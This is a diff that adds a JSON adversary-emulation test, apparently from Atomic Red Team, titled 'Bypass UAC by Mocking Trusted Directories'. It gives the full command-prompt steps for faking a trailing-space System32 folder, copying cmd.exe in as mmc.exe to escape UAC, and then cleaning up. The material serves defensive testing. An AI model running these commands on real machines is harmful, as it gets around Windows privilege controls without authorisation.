@@ -1,0 +1,52 @@
+{
+  "id": "f7a35090-6f7f-4f64-bb47-d657bf5b10c1",
+  "name": "Bypass UAC by Mocking Trusted Directories",
+  "description": "Creates a fake \"trusted directory\" and copies a binary to bypass UAC. The UAC bypass may not work on fully patched systems\nUpon execution the directory structure should exist if the system is patched, if unpatched Microsoft Management Console should launch\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "fefc5a9d-94ac-4e3e-8a38-f70e2572982f",
+      "type": "execute-command",
+      "data": {
+        "command": "mkdir \"\\\\?\\C:\\Windows \\System32\\\"\ncopy \"#{executable_binary}\" \"\\\\?\\C:\\Windows \\System32\\mmc.exe\"\nmklink c:\\testbypass.exe \"\\\\?\\C:\\Windows \\System32\\mmc.exe\"\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "e11905f8-e63c-4c14-ba4a-d79ab1c4b111",
+      "type": "execute-command",
+      "data": {
+        "command": "rd \"\\\\?\\C:\\Windows \\\" /S /Q \u003enul 2\u003enul\ndel \"c:\\testbypass.exe\" \u003enul 2\u003enul\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "fefc5a9d-94ac-4e3e-8a38-f70e2572982f",
+      "p": "on-success",
+      "o": "e11905f8-e63c-4c14-ba4a-d79ab1c4b111"
+    },
+    {
+      "s": "fefc5a9d-94ac-4e3e-8a38-f70e2572982f",
+      "p": "on-failure",
+      "o": "e11905f8-e63c-4c14-ba4a-d79ab1c4b111"
+    }
+  ],
+  "tags": [
+    "T1548.002",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "executable_binary",
+      "type": "path",
+      "description": "Binary to execute with UAC Bypass",
+      "value": "C:\\Windows\\System32\\cmd.exe"
+    }
+  ]
+}
